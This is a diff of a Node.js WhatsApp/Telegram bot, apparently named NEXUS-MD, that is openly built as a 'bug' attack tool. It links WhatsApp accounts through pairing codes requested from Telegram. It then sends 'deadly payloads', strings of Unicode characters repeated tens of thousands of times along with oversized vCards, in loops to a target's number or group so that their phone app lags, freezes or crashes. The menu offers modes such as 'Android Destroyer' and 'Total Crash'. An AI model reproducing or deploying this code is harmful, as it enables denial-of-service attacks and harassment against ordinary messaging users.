@@ -4,7 +4,8 @@ const {
     fetchLatestBaileysVersion, 
     DisconnectReason, 
     delay,
-    Browsers
+    Browsers,
+    makeCacheableSignalKeyStore
 } = require("@whiskeysockets/baileys");
 const TelegramBot = require('node-telegram-bot-api');
 const pino = require('pino');
@@ -23,7 +24,7 @@ let botConfig = {
     isPublic: false 
 };
 
-app.get('/', (req, res) => res.send('Nexus Elite System Online! ☠️'));
+app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
 app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));
 
 async function startNexus() {
@@ -32,32 +33,44 @@ async function startNexus() {
 
     const sock = makeWASocket({
         version,
-        auth: state,
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
+        },
         logger: pino({ level: 'silent' }),
-        // --- 🛠️ PAIRING FIX: අලුත්ම BROWSER AGENT එක ---
-        browser: Browsers.macOS("Desktop"), 
+        // --- 🛠️ LINK NOTIFICATION FIX ---
+        browser: ["Ubuntu", "Chrome", "20.0.04"], 
         printQRInTerminal: false,
+        mobile: false,
         syncFullHistory: false
     });
 
-    // --- 🤖 TELEGRAM PAIRING (FIXED) ---
+    // --- 🤖 TELEGRAM PAIRING (LINK NOTIFICATION FIXED) ---
     tgBot.on('message', async (msg) => {
         const text = msg.text;
+        const chatId = msg.chat.id;
+
         if (text === '/start') {
-            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 BUG SYSTEM*\n\nPairing Code එක ලබා ගැනීමට WhatsApp අංකය එවන්න.\n*(Ex: 94767475809)*", { parse_mode: 'Markdown' });
+            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 BUG SYSTEM*\n\nPairing Code එක ලබා ගැනීමට WhatsApp අංකය එවන්න.\n*(Ex: 94767475809)*", { parse_mode: 'Markdown' });
         }
+
         if (text && /^\d+$/.test(text) && text.length > 9) {
             try {
-                tgBot.sendMessage(msg.chat.id, "⏳ *සකසමින් පවතී...*");
-                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
-                tgBot.sendMessage(msg.chat.id, `🔥 *YOUR CODE:* \`${code}\``, { parse_mode: 'Markdown' });
+                tgBot.sendMessage(chatId, "⏳ *සකසමින් පවතී... කරුණාකර ඔබගේ WhatsApp Notification බලන්න.*");
+                
+                // Pairing request එක යවන කොටස
+                setTimeout(async () => {
+                    let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
+                    tgBot.sendMessage(chatId, `🔥 *YOUR CODE:* \`${code}\``, { parse_mode: 'Markdown' });
+                }, 3000);
+
             } catch (e) {
-                tgBot.sendMessage(msg.chat.id, "❌ *Error!* Restart Bot and Try Again.");
+                tgBot.sendMessage(chatId, "❌ *Error!* Restart Bot and Try Again.");
             }
         }
     });
 
-    // --- 📩 WHATSAPP BUG HANDLER ---
+    // --- 📩 WHATSAPP BUG HANDLER (9 MODES) ---
     sock.ev.on('messages.upsert', async (chatUpdate) => {
         try {
             const mek = chatUpdate.messages[0];
@@ -75,7 +88,7 @@ async function startNexus() {
             const text = body.trim().split(/ +/).slice(1).join(" ");
             const target = text + "@s.whatsapp.net";
 
-            // --- 🦠 THE DEADLY PAYLOADS ---
+            // --- 🦠 DEADLY PAYLOADS ---
             const bug1 = "☠️" + "ꦿ".repeat(45000); 
             const bug2 = "🔥" + "᥋".repeat(50000); 
             const bug3 = "❄️" + "꠵".repeat(55000); 
@@ -87,46 +100,31 @@ async function startNexus() {
 │
 │ 🦠 *ELITE BUG SYSTEM (9 MODES)*
 │
-├ ☠️ *1. .ios1* [num] - iPhone Hard Lag
-├ 🔥 *2. .ios2* [num] - iPhone UI Freeze
-├ 💀 *3. .kill* [num] - Android Destroyer
-├ ❄️ *4. .freeze* [num] - System Lag
-├ 📍 *5. .loc* [num] - Location Bug
-├ 📇 *6. .vcard* [num] - Contact Crash
-├ 🌀 *7. .group* [jid] - Group Destroyer
-├ 🧨 *8. .bomb* [num] - Spam Bug
-├ 🌌 *9. .the_end* [num] - Total System Wipe
+├ ☠️ *1. .ios1* - iPhone Hard Lag
+├ 🔥 *2. .ios2* - iPhone UI Freeze
+├ 💀 *3. .kill* - Android Destroyer
+├ ❄️ *4. .freeze* - System Lag
+├ 📍 *5. .loc* - Location Bug
+├ 📇 *6. .vcard* - Contact Crash
+├ 🌀 *7. .group* - Group Destroyer
+├ 🧨 *8. .bomb* - Spam Bug
+├ 🌌 *9. .the_end* - Total Crash
 │
 ╰─────────────┈
  👑 *DEV:* SASIYA MD`;
 
-                    await sock.sendMessage(from, { 
-                        text: menu,
-                        contextInfo: { 
-                            externalAdReply: { 
-                                title: "NEXUS-MD ULTIMATE BUG BOT",
-                                body: "iPhone & Android Destroyer Active",
-                                mediaType: 1,
-                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", 
-                            }
-                        }
-                    }, { quoted: mek });
+                    await sock.sendMessage(from, { text: menu }, { quoted: mek });
                     break;
 
                 case 'ios1':
-                case 'ios2':
+                case 'the_end':
                     if (!text) return;
+                    await sock.sendMessage(from, { text: "🌑 *DEPLOYING KILLER BUG...*" });
                     for(let i=0; i<12; i++) {
-                        await sock.sendMessage(target, { text: bug2 + "".repeat(30000) });
+                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
                         await delay(400);
                     }
-                    await sock.sendMessage(from, { text: "💀 iPhone Target Is Dead!" });
-                    break;
-
-                case 'kill':
-                case 'freeze':
-                    if (!text) return;
-                    await sock.sendMessage(target, { text: bug1 + bug3 });
+                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED!*" });
                     break;
 
                 case 'vcard':
@@ -134,31 +132,11 @@ async function startNexus() {
                     await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                     break;
 
-                case 'loc':
-                    await sock.sendMessage(target, { location: { degreesLatitude: 37, degreesLongitude: -122, name: "NEXUS-" + "X".repeat(35000) } });
-                    break;
-
                 case 'group':
                     if (!text) return;
                     for(let i=0; i<10; i++) {
                         await sock.sendMessage(text, { text: bug1 + bug2 + bug3 });
                     }
-                    break;
-
-                case 'bomb':
-                    for(let i=0; i<20; i++) {
-                        await sock.sendMessage(target, { text: "🔥 SPAM 🔥\n" + "҈".repeat(10000) });
-                    }
-                    break;
-
-                case 'the_end':
-                    if (!text) return;
-                    await sock.sendMessage(from, { text: "🌑 *THE END SYSTEM DEPLOYING...*" });
-                    for(let i=0; i<15; i++) {
-                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
-                        await delay(300);
-                    }
-                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED!*" });
                     break;
             }
         } catch (e) { console.log(e); }
